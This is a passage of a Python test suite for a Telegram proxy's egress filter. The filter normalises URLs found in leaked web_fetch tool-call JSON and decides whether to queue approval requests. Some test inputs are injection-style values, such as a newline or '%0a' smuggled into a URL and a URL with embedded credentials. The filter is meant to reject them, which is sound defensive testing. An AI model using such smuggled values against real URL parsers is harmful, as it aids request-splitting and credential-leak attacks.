                "text": '{"name":"web_fetch","arguments":{"url":"https://.waether.com/weather/today"}}',
            }
        ).encode()

        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)

        assert called["value"] is True
        assert called["kwargs"]["destination"] == "https://waether.com"
        assert "approval request queued" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_approval_strips_trailing_punctuation(self, monkeypatch):
        """Trailing punctuation in leaked URL should be normalized before approval check."""
        called = {"value": False}

        class FakeEgress:
            async def check_async(self, **kwargs):
                called["value"] = True
                called["kwargs"] = kwargs
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": '{"name":"web_fetch","arguments":{"url":"https://accuweather.com)"}}',
            }
        ).encode()

        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)

        assert called["value"] is True
        assert called["kwargs"]["destination"] == "https://accuweather.com"
        assert "approval request queued" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_invalid_host_does_not_queue_approval(self, monkeypatch):
        """Non-domain hosts should not queue egress approval requests."""
        calls = {"count": 0}

        class FakeEgress:
            async def check_async(self, **_kwargs):
                calls["count"] += 1
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": '{"name":"web_fetch","arguments":{"url":"https://localhost"}}',
            }
        ).encode()

        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)

        assert calls["count"] == 0
        assert "approval request queued" not in result["text"].lower()

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_filename_reference_does_not_queue_approval(self, monkeypatch):
        """Filename-like references must not be interpreted as egress domains."""
        calls = {"count": 0}

        class FakeEgress:
            async def check_async(self, **_kwargs):
                calls["count"] += 1
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": '{"name":"web_fetch","arguments":{"url":"BOOTSTRAP.md"}}',
            }
        ).encode()

        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)

        assert calls["count"] == 0
        assert "approval request queued" not in result["text"].lower()

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_explicit_md_tld_domain_still_queues_approval(
        self, monkeypatch
    ):
        """Explicitly schemed domains should still queue approvals even for .md ccTLD."""
        called = {"value": False}

        class FakeEgress:
            async def check_async(self, **kwargs):
                called["value"] = True
                called["kwargs"] = kwargs
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": '{"name":"web_fetch","arguments":{"url":"https://example.md/status"}}',
            }
        ).encode()

        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)

        assert called["value"] is True
        assert called["kwargs"]["destination"] == "https://example.md"
        assert "approval request queued" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_ip_host_does_not_queue_approval(self, monkeypatch):
        """Literal IP targets should not enter interactive domain approval flow."""
        calls = {"count": 0}

        class FakeEgress:
            async def check_async(self, **_kwargs):
                calls["count"] += 1
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": '{"name":"web_fetch","arguments":{"url":"http://127.0.0.1:8080"}}',
            }
        ).encode()

        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)

        assert calls["count"] == 0
        assert "approval request queued" not in result["text"].lower()

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_malformed_hyphen_domain_does_not_queue_approval(
        self, monkeypatch
    ):
        """Malformed domain labels should be rejected before approval queueing."""
        calls = {"count": 0}

        class FakeEgress:
            async def check_async(self, **_kwargs):
                calls["count"] += 1
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": '{"name":"web_fetch","arguments":{"url":"https://-bad.example.com"}}',
            }
        ).encode()

        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)

        assert calls["count"] == 0
        assert "approval request queued" not in result["text"].lower()

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_consecutive_dot_domain_does_not_queue_approval(
        self, monkeypatch
    ):
        """Consecutive-dot domains should be rejected before approval queueing."""
        calls = {"count": 0}

        class FakeEgress:
            async def check_async(self, **_kwargs):
                calls["count"] += 1
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": '{"name":"web_fetch","arguments":{"url":"https://good..example.com"}}',
            }
        ).encode()

        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)

        assert calls["count"] == 0
        assert "approval request queued" not in result["text"].lower()

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_domain_with_invalid_chars_does_not_queue_approval(
        self, monkeypatch
    ):
        """Domains containing invalid hostname characters must be rejected."""
        calls = {"count": 0}

        class FakeEgress:
            async def check_async(self, **_kwargs):
                calls["count"] += 1
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": '{"name":"web_fetch","arguments":{"url":"https://exa_mple.com"}}',
            }
        ).encode()

        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)

        assert calls["count"] == 0
        assert "approval request queued" not in result["text"].lower()

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_url_with_trailing_quote_still_queues_approval(
        self, monkeypatch
    ):
        """Trailing quote punctuation in leaked URL should still normalize and queue approval."""
        called = {"value": False}

        class FakeEgress:
            async def check_async(self, **kwargs):
                called["value"] = True
                called["kwargs"] = kwargs
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": '{"name":"web_fetch","arguments":{"url":"https://weather.com\\""}}',
            }
        ).encode()

        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)

        assert called["value"] is True
        assert called["kwargs"]["destination"] == "https://weather.com"
        assert "approval request queued" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_url_with_trailing_backtick_still_queues_approval(
        self, monkeypatch
    ):
        """Trailing markdown backtick in leaked URL should normalize for approval."""
        called = {"value": False}

        class FakeEgress:
            async def check_async(self, **kwargs):
                called["value"] = True
                called["kwargs"] = kwargs
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": '{"name":"web_fetch","arguments":{"url":"https://weather.com`"}}',
            }
        ).encode()

        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)

        assert called["value"] is True
        assert called["kwargs"]["destination"] == "https://weather.com"
        assert "approval request queued" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_url_with_control_character_does_not_queue_approval(
        self, monkeypatch
    ):
        """Control characters in leaked URL should be rejected before queueing approval."""
        calls = {"count": 0}

        class FakeEgress:
            async def check_async(self, **_kwargs):
                calls["count"] += 1
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": '{"name":"web_fetch","arguments":{"url":"https://weather.com/\\nsecret"}}',
            }
        ).encode()

        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)

        assert calls["count"] == 0
        assert "approval request queued" not in result["text"].lower()

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_url_with_backslashes_does_not_queue_approval(
        self, monkeypatch
    ):
        """Backslash-containing URLs should be rejected to avoid parser confusion."""
        calls = {"count": 0}

        class FakeEgress:
            async def check_async(self, **_kwargs):
                calls["count"] += 1
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": '{"name":"web_fetch","arguments":{"url":"https:\\\\weather.com\\\\today"}}',
            }
        ).encode()

        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)

        assert calls["count"] == 0
        assert "approval request queued" not in result["text"].lower()

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_url_with_percent_encoded_control_does_not_queue_approval(
        self, monkeypatch
    ):
        """Percent-encoded control bytes should be rejected before queueing approval."""
        calls = {"count": 0}

        class FakeEgress:
            async def check_async(self, **_kwargs):
                calls["count"] += 1
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": '{"name":"web_fetch","arguments":{"url":"https://weather.com/%0asecret"}}',
            }
        ).encode()

        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)

        assert calls["count"] == 0
        assert "approval request queued" not in result["text"].lower()

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_url_with_whitespace_queues_approval_using_first_token(
        self, monkeypatch
    ):
        """Whitespace in leaked URL should queue approval using first URL token."""
        calls = {"count": 0}

        class FakeEgress:
            async def check_async(self, **_kwargs):
                calls["count"] += 1
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": '{"name":"web_fetch","arguments":{"url":"https://weather.com /today"}}',
            }
        ).encode()

        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)

        assert calls["count"] == 1
        assert "approval request queued" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_non_http_scheme_does_not_queue_approval(self, monkeypatch):
        """Non-http schemes should never queue web-fetch approvals."""
        calls = {"count": 0}

        class FakeEgress:
            async def check_async(self, **_kwargs):
                calls["count"] += 1
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": '{"name":"web_fetch","arguments":{"url":"ftp://weather.com/archive.txt"}}',
            }
        ).encode()

        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)

        assert calls["count"] == 0
        assert "approval request queued" not in result["text"].lower()

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_userinfo_url_does_not_queue_approval(self, monkeypatch):
        """URLs with credentials should not be queued for web-fetch approvals."""
        calls = {"count": 0}

        class FakeEgress:
            async def check_async(self, **_kwargs):
                calls["count"] += 1
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": '{"name":"web_fetch","arguments":{"url":"https://admin:secret@weather.com/private"}}',
            }
        ).encode()

        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)

        assert calls["count"] == 0
        assert "approval request queued" not in result["text"].lower()

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_non_standard_port_does_not_queue_approval(self, monkeypatch):
        """web_fetch approvals should not queue for non-standard destination ports."""
        calls = {"count": 0}

        class FakeEgress:
            async def check_async(self, **_kwargs):
                calls["count"] += 1
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": '{"name":"web_fetch","arguments":{"url":"https://weather.com:8443/status"}}',
            }
        ).encode()

        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)

        assert calls["count"] == 0
        assert "approval request queued" not in result["text"].lower()

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_internal_suffix_domain_does_not_queue_approval(
        self, monkeypatch
    ):
        """Internal pseudo-TLD hosts should be rejected from approval queue."""
        calls = {"count": 0}

        class FakeEgress:
            async def check_async(self, **_kwargs):
                calls["count"] += 1
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": '{"name":"web_fetch","arguments":{"url":"https://weather.local/today"}}',
            }
        ).encode()

        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)

        assert calls["count"] == 0
        assert "approval request queued" not in result["text"].lower()

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_overlong_url_does_not_queue_approval(self, monkeypatch):
        """Overly long URLs should be rejected before approval queueing."""
        calls = {"count": 0}

        class FakeEgress:
            async def check_async(self, **_kwargs):
                calls["count"] += 1
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        long_path = "a" * 2100
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": json.dumps(
                    {"name": "web_fetch", "arguments": {"url": f"https://weather.com/{long_path}"}}
                ),
            }
        ).encode()

        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)

        assert calls["count"] == 0
        assert "approval request queued" not in result["text"].lower()

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_numeric_tld_does_not_queue_approval(self, monkeypatch):
        """Domains with numeric TLDs should not enter approval queue."""
        calls = {"count": 0}

        class FakeEgress:
            async def check_async(self, **_kwargs):
                calls["count"] += 1
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": '{"name":"web_fetch","arguments":{"url":"https://weather.123/today"}}',
            }
        ).encode()

        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)

        assert calls["count"] == 0
        assert "approval request queued" not in result["text"].lower()

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_overlong_fqdn_does_not_queue_approval(self, monkeypatch):
        """Domains over 253 chars should be rejected before queueing approvals."""
        calls = {"count": 0}

        class FakeEgress:
            async def check_async(self, **_kwargs):
                calls["count"] += 1
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        host = ".".join(["a" * 63, "b" * 63, "c" * 63, "d" * 62])  # 254 chars
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": json.dumps(
                    {"name": "web_fetch", "arguments": {"url": f"https://{host}/today"}}
                ),
            }
        ).encode()

        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)

        assert calls["count"] == 0
        assert "approval request queued" not in result["text"].lower()

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_punycode_domain_does_not_queue_approval(self, monkeypatch):
        """Punycode/IDN domains should be rejected from approval queue."""
        calls = {"count": 0}

        class FakeEgress:
            async def check_async(self, **_kwargs):
                calls["count"] += 1
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": '{"name":"web_fetch","arguments":{"url":"https://xn--e1afmkfd.xn--p1ai/today"}}',
            }
        ).encode()

        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)

        assert calls["count"] == 0
        assert "approval request queued" not in result["text"].lower()

    async def test_raw_web_fetch_json_uppercase_http_scheme_queues_port_80_approval(
        self, monkeypatch
    ):
        """Uppercase HTTP schemes should normalize and queue on port 80."""
        called = {"value": False}

        class FakeEgress:
            async def check_async(self, **kwargs):
                called["value"] = True
                called["kwargs"] = kwargs
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": '{"name":"web_fetch","arguments":{"url":"HTTP://weather.com/today"}}',
            }
        ).encode()

        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)

        assert called["value"] is True
        assert called["kwargs"]["destination"] == "http://weather.com"
        assert called["kwargs"]["port"] == 80
        assert "approval request queued" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_scheme_relative_url_queues_https_approval(self, monkeypatch):
        """Scheme-relative URLs in leaked JSON should normalize to HTTPS approval."""
        called = {"value": False}

        class FakeEgress:
            async def check_async(self, **kwargs):
                called["value"] = True
                called["kwargs"] = kwargs
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": '{"name":"web_fetch","arguments":{"url":"//weather.com/today"}}',
            }
        ).encode()

        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)

        assert called["value"] is True
        assert called["kwargs"]["destination"] == "https://weather.com"
        assert called["kwargs"]["port"] == 443
        assert "approval request queued" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_url_with_html_entity_domain_still_queues_approval(
        self, monkeypatch
    ):
        """HTML-entity encoded domains in leaked JSON should normalize before approval."""
        called = {"value": False}

        class FakeEgress:
            async def check_async(self, **kwargs):
                called["value"] = True
                called["kwargs"] = kwargs
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": '{"name":"web_fetch","arguments":{"url":"https://weather&#46;com/weather/today"}}',
            }
        ).encode()

        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)

        assert called["value"] is True
        assert called["kwargs"]["destination"] == "https://weather.com"
        assert "approval request queued" in result["text"].lower()

    def test_sanitize_reason_hides_internal_paths(self):
        """User-facing block reasons should not expose modules or file paths."""
        reason = (
            "ContextGuard failed at gateway.security.context_guard "
            "/app/agentshroud/gateway/security/context_guard.py line 22"
        )
        sanitized = TelegramAPIProxy._sanitize_reason(reason)
        assert "gateway.security.context_guard" not in sanitized
        assert "/app/agentshroud" not in sanitized

    @pytest.mark.asyncio
    async def test_forward_to_telegram_returns_http_error_json(self, monkeypatch):
        """HTTPError JSON payloads should be returned as structured API responses."""
        proxy = TelegramAPIProxy()

        def _raise_http_error(*args, **kwargs):
            raise urllib.error.HTTPError(
                url="https://api.telegram.org/botXXX/sendMessage",
                code=400,
                msg="Bad Request",
                hdrs=None,
                fp=io.BytesIO(
                    b'{"ok":false,"error_code":400,"description":"Bad Request: chat not found"}'
                ),
            )

        monkeypatch.setattr(urllib.request, "urlopen", _raise_http_error)
        result = await proxy._forward_to_telegram(
            "https://api.telegram.org/botXXX/sendMessage",
            json.dumps({"chat_id": "bad", "text": "x"}).encode(),
            "application/json",
        )

        assert result["ok"] is False
        assert result["error_code"] == 400
        assert "chat not found" in result["description"].lower()

    @pytest.mark.asyncio
    async def test_forward_to_telegram_handles_http_error_non_json(self, monkeypatch):
        """Non-JSON HTTPError payloads should still produce a safe fallback dict."""
        proxy = TelegramAPIProxy()

        def _raise_http_error(*args, **kwargs):
            raise urllib.error.HTTPError(
                url="https://api.telegram.org/botXXX/sendMessage",
                code=500,
                msg="Internal Server Error",
                hdrs=None,
                fp=io.BytesIO(b"gateway failure"),
            )

        monkeypatch.setattr(urllib.request, "urlopen", _raise_http_error)
        result = await proxy._forward_to_telegram(
            "https://api.telegram.org/botXXX/sendMessage",
            json.dumps({"chat_id": "1", "text": "x"}).encode(),
            "application/json",
        )

        assert result["ok"] is False
        assert result["error_code"] == 500


class TestWebSearchLog:
    """Tests for _trigger_web_search_log and raw web_search JSON outbound handling."""

    @pytest.mark.asyncio
    async def test_web_search_log_called_with_correct_params(self, monkeypatch):
        """_trigger_web_search_log calls log_external_decision with Brave domain and query."""
        log_calls = []

        class _MockAQ:
            def log_external_decision(self, **kwargs):
                log_calls.append(kwargs)

        class _MockEgress:
            _approval_queue = _MockAQ()

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(state_module, "app_state", SimpleNamespace(egress_filter=_MockEgress()))
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        await proxy._trigger_web_search_log("8096968754", {"query": "BESS alarm count"})

        assert len(log_calls) == 1
        call = log_calls[0]
        assert call["domain"] == "api.search.brave.com"
        assert call["decision"] == "allow"
        assert "8096968754" in call["agent_id"]
        assert "BESS alarm count" in call["reason"]

    @pytest.mark.asyncio
    async def test_web_search_no_egress_filter(self, monkeypatch):
        """_trigger_web_search_log returns silently when egress_filter is None."""
        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(state_module, "app_state", SimpleNamespace(egress_filter=None))
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        # Must not raise
        await proxy._trigger_web_search_log("123", {"query": "test"})

    @pytest.mark.asyncio
    async def test_web_search_query_truncation(self, monkeypatch):
        """Queries longer than 200 chars are truncated in the SOC log reason."""
        log_calls = []

        class _MockAQ:
            def log_external_decision(self, **kwargs):
                log_calls.append(kwargs)

        class _MockEgress:
            _approval_queue = _MockAQ()

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(state_module, "app_state", SimpleNamespace(egress_filter=_MockEgress()))
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        long_query = "x" * 300
        await proxy._trigger_web_search_log("123", {"query": long_query})

        assert len(log_calls) == 1
        # Reason embeds the truncated query (max 200 chars)
        reason = log_calls[0]["reason"]
        assert len(reason) < 300

    @pytest.mark.asyncio
    async def test_raw_web_search_json_owner_message(self):
        """Owner chat: raw web_search JSON produces 'Switch to tool-capable model' message."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": '{"name":"web_search","arguments":{"query":"BESS alarms"}}',
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "web search" in result["text"].lower() or "switch" in result["text"].lower()
        assert "web_search" not in result["text"]

    @pytest.mark.asyncio
    async def test_raw_web_search_json_collaborator_safe_notice(self):
        """Collaborator chat: raw web_search JSON produces a safe notice."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())

        class _MockRBAC:
            owner_user_id = "8096968754"

        proxy._rbac = _MockRBAC()
        body = json.dumps(
            {
                "chat_id": "9999999999",  # not the owner
                "text": '{"name":"web_search","arguments":{"query":"BESS alarms"}}',
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        # Must not expose raw tool JSON to collaborators
        assert "web_search" not in result["text"]
        assert "arguments" not in result["text"]


class TestRuntimeRewriteHelpers:
    """Unit tests for deterministic runtime error rewrite helper behavior."""

    def test_rewrite_known_runtime_errors_matches_memory_embedding_provider_error(self):
        text = "Memory search unavailable: embedding/provider error during index bootstrap."
        rewritten = TelegramAPIProxy._rewrite_known_runtime_errors(text)
        assert rewritten is not None
        assert "runtime dependency error" in rewritten.lower()

    def test_rewrite_known_runtime_errors_matches_healthcheck_skill_sandbox_error(self):
        text = "Cannot access healthcheck SKILL.md due to sandbox restrictions."
        rewritten = TelegramAPIProxy._rewrite_known_runtime_errors(text)
        assert rewritten is not None
        assert "/healthcheck" in rewritten.lower()

    def test_rewrite_known_runtime_errors_returns_none_for_unrelated_text(self):
        text = "Memory search unavailable: disk read issue (no embedding provider context)."
        assert TelegramAPIProxy._rewrite_known_runtime_errors(text) is None

    def test_rewrite_known_runtime_errors_accepts_hyphen_delimiter(self):
        text = "Memory search disabled: embedding-provider error during index bootstrap."
        rewritten = TelegramAPIProxy._rewrite_known_runtime_errors(text)
        assert rewritten is not None
        assert "runtime dependency error" in rewritten.lower()

    def test_rewrite_known_runtime_errors_requires_skill_marker_for_healthcheck_branch(self):
        text = "Cannot access healthcheck diagnostics due to sandbox restrictions."
        assert TelegramAPIProxy._rewrite_known_runtime_errors(text) is None

    def test_rewrite_known_runtime_errors_accepts_underscore_delimiter(self):
        text = "Memory search disabled: embedding_provider error during index bootstrap."
        rewritten = TelegramAPIProxy._rewrite_known_runtime_errors(text)
        assert rewritten is not None
        assert "runtime dependency error" in rewritten.lower()

    def test_rewrite_known_runtime_errors_matches_cannot_to_access_variant(self):
        text = "I cannot to access healthcheck skill.md due to sandbox restrictions."
        rewritten = TelegramAPIProxy._rewrite_known_runtime_errors(text)
        assert rewritten is not None
        assert "/healthcheck" in rewritten.lower()

    def test_rewrite_known_runtime_errors_handles_non_string_input(self):
        assert TelegramAPIProxy._rewrite_known_runtime_errors(None) is None
        assert TelegramAPIProxy._rewrite_known_runtime_errors({"text": "x"}) is None

    def test_rewrite_known_runtime_errors_matches_http_status_without_body(self):
        rewritten = TelegramAPIProxy._rewrite_known_runtime_errors("404 status code (no body)")
        assert rewritten is not None
        assert "runtime transport error" in rewritten.lower()
        assert "/healthcheck" in rewritten.lower()

    def test_rewrite_known_runtime_errors_matches_no_response_generated_phrase(self):
        rewritten = TelegramAPIProxy._rewrite_known_runtime_errors(
            "No response generated. Please try again."
        )
        assert rewritten is not None
        assert "response generation failed" in rewritten.lower()


class TestEgressTargetExtraction:
    """Unit tests for outbound target extraction helper used by egress preflight."""

    def test_extract_first_egress_target_strips_trailing_punctuation(self):
        text = "please check https://weather.com/weather/today/l/Pittsburgh,PA)."
        target = TelegramAPIProxy._extract_first_egress_target(text)
        assert target == "https://weather.com/weather/today/l/Pittsburgh,PA"

    def test_extract_first_egress_target_supports_protocol_relative_urls(self):
        text = "fetch from //accuweather.com/en/us/pittsburgh-pa/weather-forecast/1310"
        target = TelegramAPIProxy._extract_first_egress_target(text)
        assert target == "https://accuweather.com/en/us/pittsburgh-pa/weather-forecast/1310"

    def test_extract_first_egress_target_ignores_non_http_scheme_and_uses_bare_domain(self):
        text = "open ftp://malicious.test and then weather.com/today"
        target = TelegramAPIProxy._extract_first_egress_target(text)
        assert target == "https://weather.com/today"

    def test_extract_first_egress_target_does_not_treat_email_as_domain_target(self):
        text = "email me at steve@weather.com and nothing else"
        target = TelegramAPIProxy._extract_first_egress_target(text)
